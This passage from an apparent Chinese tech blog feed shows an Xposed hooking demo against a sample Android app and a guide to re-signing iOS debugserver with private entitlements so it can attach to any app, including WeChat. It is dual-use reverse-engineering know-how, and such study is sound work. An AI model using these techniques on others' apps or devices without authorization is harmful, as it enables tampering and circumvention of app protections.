class="hljs-comment">//XposedHelpers.findAndHookMethod(&quot;com.example.xposedhooktarget.HookDemo&quot;, clazz.getClassLoader(), &quot;publicFunc&quot;, String.class, new XC_MethodHook()</span><br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;publicFunc&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, publicFunc are hooked&quot;</span>;<br>                    XposedHelpers.setIntField(param.thisObject, <span class="hljs-string">&quot;publicInt&quot;</span>, <span class="hljs-number">199</span>);<br>                    XposedHelpers.setIntField(param.thisObject, <span class="hljs-string">&quot;privateInt&quot;</span>, <span class="hljs-number">299</span>);<br>                    <span class="hljs-comment">// 让hook的对象本身去执行流程</span><br>                    Method md = clazz.getDeclaredMethod(<span class="hljs-string">&quot;hideFunc&quot;</span>, String.class);<br>                    md.setAccessible(<span class="hljs-keyword">true</span>);<br>                    <span class="hljs-comment">//md.invoke(param.thisObject, &quot;Haha, hideFunc was hooked&quot;);</span><br>                    XposedHelpers.callMethod(param.thisObject, <span class="hljs-string">&quot;hideFunc&quot;</span>, <span class="hljs-string">&quot;Haha, hideFunc was hooked&quot;</span>);<br><br>                    <span class="hljs-comment">//实例化对象，然后再调用HideFunc方法</span><br>                    <span class="hljs-comment">//Constructor constructor = clazz.getConstructor();</span><br>                    <span class="hljs-comment">//XposedHelpers.callMethod(constructor.newInstance(), &quot;hideFunc&quot;, &quot;Haha, hideFunc was hooked&quot;);</span><br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook私有方法privateFunc，修改参数</span><br>            <span class="hljs-comment">//XposedHelpers.findAndHookMethod(&quot;com.example.xposedhooktarget.HookDemo&quot;, clazz.getClassLoader(), &quot;privateFunc&quot;, String.class, new XC_MethodHook()</span><br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;privateFunc&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, privateFunc are hooked&quot;</span>;<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook私有静态方法staticPrivateFunc, 修改参数</span><br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;staticPrivateFunc&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, staticPrivateFunc are hooked&quot;</span>;<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook复杂参数函数complexParameterFunc</span><br>            Class fclass1 = XposedHelpers.findClass(<span class="hljs-string">&quot;java.util.Map&quot;</span>, loadPackageParam.classLoader);<br>            Class fclass2 = XposedHelpers.findClass(<span class="hljs-string">&quot;java.util.ArrayList&quot;</span>, loadPackageParam.classLoader);<br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;complexParameterFunc&quot;</span>, String.class,<br>                    <span class="hljs-string">&quot;[[Ljava.lang.String;&quot;</span>, fclass1, fclass2, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                            param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, complexParameterFunc are hooked&quot;</span>;<br>                        &#125;<br>                    &#125;);<br><br>            <span class="hljs-comment">//Hook私有方法repleaceFunc, 替换打印内容</span><br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;repleaceFunc&quot;</span>, <span class="hljs-keyword">new</span> XC_MethodReplacement() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">replaceHookedMethod</span><span class="hljs-params">(MethodHookParam methodHookParam)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    Log.d(<span class="hljs-string">&quot;HookDemo&quot;</span>, <span class="hljs-string">&quot;Haha, repleaceFunc are replaced&quot;</span>);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br>            &#125;);<br>            <span class="hljs-comment">//Hook方法, anonymousInner， 参数是抽象类，先加载所需要的类即可</span><br>            Class animalClazz  = loadPackageParam.classLoader.loadClass(<span class="hljs-string">&quot;com.example.xposedhooktarget.Animal&quot;</span>);<br>            XposedHelpers.findAndHookMethod(clazz, <span class="hljs-string">&quot;anonymousInner&quot;</span>, animalClazz, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                    XposedBridge.log(<span class="hljs-string">&quot;HookDemo This is test&quot;</span>);<br>                    param.args[<span class="hljs-number">1</span>] = <span class="hljs-string">&quot;Haha, anonymousInner are hooked&quot;</span>;<br>                &#125;<br>            &#125;);<br><br>            <span class="hljs-comment">//Hook匿名类的eatFunc方法，修改参数，顺便修改类中的anonymoutInt变量</span><br>            XposedHelpers.findAndHookMethod(<span class="hljs-string">&quot;com.example.xposedhooktarget.HookDemo$1&quot;</span>, clazz.getClassLoader(),<br>                    <span class="hljs-string">&quot;eatFunc&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                            param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, eatFunc are hooked&quot;</span>;<br>                            XposedHelpers.setIntField(param.thisObject, <span class="hljs-string">&quot;anonymoutInt&quot;</span>, <span class="hljs-number">499</span>);<br>                        &#125;<br>                    &#125;);<br><br>            <span class="hljs-comment">//hook内部类的构造方法失败，且会导致hook内部类的InnerFunc方法也失败，原因不明</span><br><span class="hljs-comment">//            XposedHelpers.findAndHookConstructor(clazz1, new XC_MethodHook() &#123;</span><br><span class="hljs-comment">//                        @Override</span><br><span class="hljs-comment">//                        protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="hljs-comment">//                            XposedBridge.log(&quot;Haha, InnerClass constructed was hooked&quot; );</span><br><span class="hljs-comment">//                        &#125;</span><br><span class="hljs-comment">//                    &#125;);</span><br><br>            <span class="hljs-comment">//Hook内部类InnerClass的InnerFunc方法，修改参数，顺便修改类中的innerPublicInt和innerPrivateInt变量</span><br>            <span class="hljs-keyword">final</span> Class&lt;?&gt; clazz1 = XposedHelpers.findClass(<span class="hljs-string">&quot;com.example.xposedhooktarget.HookDemo$InnerClass&quot;</span>, loadPackageParam.classLoader);<br>            XposedHelpers.findAndHookMethod(clazz1, <span class="hljs-string">&quot;InnerFunc&quot;</span>, String.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;<br>                        <span class="hljs-meta">@Override</span><br>                        <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                            param.args[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;Haha, InnerFunc was hooked&quot;</span>;<br>                            XposedHelpers.setIntField(param.thisObject, <span class="hljs-string">&quot;innerPublicInt&quot;</span>, <span class="hljs-number">9</span>);<br>                            XposedHelpers.setIntField(param.thisObject, <span class="hljs-string">&quot;innerPrivateInt&quot;</span>, <span class="hljs-number">19</span>);<br>                        &#125;<br>                    &#125;);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">getClassInfo</span><span class="hljs-params">(Class clazz)</span> </span>&#123;<br>        <span class="hljs-comment">//getFields()与getDeclaredFields()区别:getFields()只能访问类中声明为公有的字段,私有的字段它无法访问，</span><br>        <span class="hljs-comment">//能访问从其它类继承来的公有方法.getDeclaredFields()能访问类中所有的字段,与public,private,protect无关，</span><br>        <span class="hljs-comment">//不能访问从其它类继承来的方法</span><br>        <span class="hljs-comment">//getMethods()与getDeclaredMethods()区别:getMethods()只能访问类中声明为公有的方法,私有的方法它无法访问,</span><br>        <span class="hljs-comment">//能访问从其它类继承来的公有方法.getDeclaredFields()能访问类中所有的字段,与public,private,protect无关,</span><br>        <span class="hljs-comment">//不能访问从其它类继承来的方法</span><br>        <span class="hljs-comment">//getConstructors()与getDeclaredConstructors()区别:getConstructors()只能访问类中声明为public的构造函数</span><br>        <span class="hljs-comment">//getDeclaredConstructors()能访问类中所有的构造函数,与public,private,protect无关</span><br><br>        <span class="hljs-comment">//XposedHelpers.setStaticObjectField(clazz,&quot;sMoney&quot;,110);</span><br>        <span class="hljs-comment">//Field sMoney = clazz.getDeclaredField(&quot;sMoney&quot;);</span><br>        <span class="hljs-comment">//sMoney.setAccessible(true);</span><br>        Field[] fs;<br>        Method[] md;<br>        Constructor[] cl;<br>        fs = clazz.getFields();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; fs.length; i++) &#123;<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getFiled: &quot;</span> + Modifier.toString(fs[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    fs[i].getType().getName() + <span class="hljs-string">&quot; &quot;</span> + fs[i].getName());<br>        &#125;<br>        fs = clazz.getDeclaredFields();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; fs.length; i++) &#123;<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getDeclaredFields: &quot;</span> + Modifier.toString(fs[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    fs[i].getType().getName() + <span class="hljs-string">&quot; &quot;</span> + fs[i].getName());<br>        &#125;<br>        md = clazz.getMethods();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; md.length; i++) &#123;<br>            Class&lt;?&gt; returnType = md[i].getReturnType();<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getMethods: &quot;</span> + Modifier.toString(md[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    returnType.getName() + <span class="hljs-string">&quot; &quot;</span> + md[i].getName());<br>            <span class="hljs-comment">//获取参数</span><br>            <span class="hljs-comment">//Class&lt;?&gt; para[] = md[i].getParameterTypes();</span><br>            <span class="hljs-comment">//for (int j = 0; j &lt; para.length; ++j) &#123;</span><br>            <span class="hljs-comment">//System.out.print(para[j].getName() + &quot; &quot; + &quot;arg&quot; + j);</span><br>            <span class="hljs-comment">//if (j &lt; para.length - 1) &#123;</span><br>            <span class="hljs-comment">//    System.out.print(&quot;,&quot;);</span><br>            <span class="hljs-comment">//&#125;</span><br>            <span class="hljs-comment">//&#125;</span><br>        &#125;<br>        md = clazz.getDeclaredMethods();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; md.length; i++) &#123;<br>            Class&lt;?&gt; returnType = md[i].getReturnType();<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getDeclaredMethods: &quot;</span> + Modifier.toString(md[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    returnType.getName() + <span class="hljs-string">&quot; &quot;</span> + md[i].getName());<br>        &#125;<br>        cl = clazz.getConstructors();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; cl.length; i++) &#123;<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getConstructors: &quot;</span> + Modifier.toString(cl[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    md[i].getName());<br>        &#125;<br>        cl = clazz.getDeclaredConstructors();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; cl.length; i++) &#123;<br>            XposedBridge.log(<span class="hljs-string">&quot;HookDemo getDeclaredConstructors: &quot;</span> + Modifier.toString(cl[i].getModifiers()) + <span class="hljs-string">&quot; &quot;</span> +<br>                    md[i].getName());<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="6-参考文献"><a href="#6-参考文献" class="headerlink" title="6.参考文献"></a>6.参考文献</h2><p><a href="https://blog.csdn.net/QQ1084283172/article/details/80954759?depth_1-utm_source=distribute.pc_relevant.none-task&utm_source=distribute.pc_relevant.none-task">hook所有方法</a></p><p><a href="https://zhuanlan.zhihu.com/p/96773935">热修补</a></p>]]></content>
    
    
    <categories>
      
      <category>xposed</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>hook</tag>
      
      <tag>xposed</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iOS修改deubgserver调试所有APP</title>
    <link href="/2021/08/22/iOS%E4%BF%AE%E6%94%B9deubgserver%E8%B0%83%E8%AF%95%E6%89%80%E6%9C%89APP/"/>
    <url>/2021/08/22/iOS%E4%BF%AE%E6%94%B9deubgserver%E8%B0%83%E8%AF%95%E6%89%80%E6%9C%89APP/</url>
    
    <content type="html"><![CDATA[<h2 id="debugserver"><a href="#debugserver" class="headerlink" title="debugserver"></a>debugserver</h2><h3 id="1-导出手机中任意一款APP签名"><a href="#1-导出手机中任意一款APP签名" class="headerlink" title="1. 导出手机中任意一款APP签名"></a>1. 导出手机中任意一款APP签名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ldid -e ./bash &gt; bash.entitlements<br></code></pre></td></tr></table></figure><h3 id="2-bash-entitlements文件内容"><a href="#2-bash-entitlements文件内容" class="headerlink" title="2. bash.entitlements文件内容"></a>2. bash.entitlements文件内容</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">plist</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//Apple//DTD PLIST 1.0//EN http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">plist</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>platform-application<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.security.no-container<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.skip-library-validation<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plist</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-导出debugserver中证书"><a href="#3-导出debugserver中证书" class="headerlink" title="3. 导出debugserver中证书"></a>3. 导出debugserver中证书</h3><p>debugserver可执行文件在<code>/Developer/usr/bin/debugserver</code></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ldid</span> -e ./debugserver &gt; <span class="hljs-literal">debug</span>.entitlements<br></code></pre></td></tr></table></figure><h3 id="4-修改后的debug-entitlements文件"><a href="#4-修改后的debug-entitlements文件" class="headerlink" title="4. 修改后的debug.entitlements文件"></a>4. 修改后的debug.entitlements文件</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">plist</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">plist</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dict</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>task_for_pid-allow<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.frontboard.debugapplications<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.springboard.debugapplications<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.backboardd.debugapplications<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.memorystatus<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>get-task-allow<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>run-unsigned-code<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.frontboard.launchapplications<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.cs.debugger<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.logging.diagnostic<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.backboardd.launchapplications<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.security.no-container<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.private.skip-library-validation<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>platform-application<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dict</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">plist</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h3 id="5-使用debug-entitlements文件对debugserver进行重新签名"><a href="#5-使用debug-entitlements文件对debugserver进行重新签名" class="headerlink" title="5. 使用debug.entitlements文件对debugserver进行重新签名"></a>5. 使用debug.entitlements文件对debugserver进行重新签名</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bas">ldid -Sdebug.entitlements debugserver<br></code></pre></td></tr></table></figure><h3 id="6-上传到手机中"><a href="#6-上传到手机中" class="headerlink" title="6. 上传到手机中"></a>6. 上传到手机中</h3><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="文件瘦身"><a href="#文件瘦身" class="headerlink" title="文件瘦身"></a>文件瘦身</h3><p>可以对debugserver进行瘦身减少文件大小(可选)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">lipo   info debugserver<span class="hljs-regexp">//</span>查看文件架构<br>lipo -thin arm64 debugserver -o _debugserver   <span class="hljs-regexp">//</span>瘦身<br>lipo。create  文件A  文件B  -output  文件C <span class="hljs-regexp">//</span>架构合并<br></code></pre></td></tr></table></figure><h3 id="苹果codesign签名方式"><a href="#苹果codesign签名方式" class="headerlink" title="苹果codesign签名方式"></a>苹果codesign签名方式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">codesign -d -vv debugserver    // 详细的签名信息<br>codesign -s - --entitlements ent.plist -f debugserver<br></code></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><ul><li><p>Failed to get connection from a remote gdb process</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">iPhone-7:~ root# debugserver 127.0.0.1:1111 -a UCWEB<br>debugserver-@(#)PROGRAM:LLDB  PROJECT:lldb-900.3.85<br> for arm64.<br>Attaching to process UCWEB...<br>Listening to port 1111 for a connection from localhost...<br>Failed to get connection from a remote gdb process.<br>Exiting.<br></code></pre></td></tr></table></figure><p>解决方案:</p><ol><li><p>USB连接可能不稳定，重新插拔一下。</p></li><li><p>设备上可能已经有一个进程占用了端口1111，导致无法连接，ps -e看下是否有debugserver已经在运行，是的话就使用killall -9 debugserver，或者直接尝试换一个调试端口。</p></li><li><p>可能是你签名debugserver的权限文件中包含以下权限导致</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.security.network.server<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>com.apple.security.network.client<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">true</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">key</span>&gt;</span>seatbelt-profiles<span class="hljs-tag">&lt;/<span class="hljs-name">key</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">array</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>debugserver<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span><br></code></pre></td></tr></table></figure><p>​       </p></li></ol></li><li><p> failed to attach to process named</p></li></ul>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">Phone-7:~ root<span class="hljs-comment"># debugserver localhost:1111 -a UCWEB</span><br>debugserver-@(<span class="hljs-comment">#)PROGRAM:LLDB  PROJECT:lldb-900.3.85</span><br> <span class="hljs-keyword">for</span> arm64.<br>Attaching to process UCWEB...<br>error: failed to attach to process named: <span class="hljs-string">&quot;&quot;</span><br>Exiting.<br></code></pre></td></tr></table></figure><p>  解决方案:找不到名字叫UCWEB的进程。尝试启动UCWEB后再执行命令即可。</p><ul><li><p>rejecting incoming connection from ::ffff:127.0.0.1</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">iPhone<span class="hljs-string">-7</span>:~ root# debugserver *:1111 -a WeChat<br>debugserver-@(#)PROGRAM:LLDB  PROJECT:lldb<span class="hljs-string">-900</span>.3.57..2<br> for arm64.<br>Attaching to process WeChat...<br>Listening to port 1111 for a connection from *...<br><span class="hljs-keyword">error: </span>rejecting incoming connection from ::ffff:127.0.0.1 (expecting ::1)<br></code></pre></td></tr></table></figure><p>解决方案:<br>解决办法是指定使用ipv4地址<br>手机端：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">iPhone<span class="hljs-number">-7</span><span class="hljs-symbol">:~</span> root<span class="hljs-comment"># debugserver 127.0.0.1:1111 -a WeChat</span><br></code></pre></td></tr></table></figure><p>电脑端使用iproxy 2222 1111</p>  <figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">(lldb) process connect connect:<span class="hljs-comment">//127.0.0.1:2222</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>osre.com<span class="hljs-regexp">/t/i</span>os12-debugserver-lldb/<span class="hljs-number">14429</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>iOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>iOS</tag>
      
      <tag>调试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iOS之fishhook</title>
    <link href="/2021/08/22/iOS%E4%B9%8Bfishhook/"/>
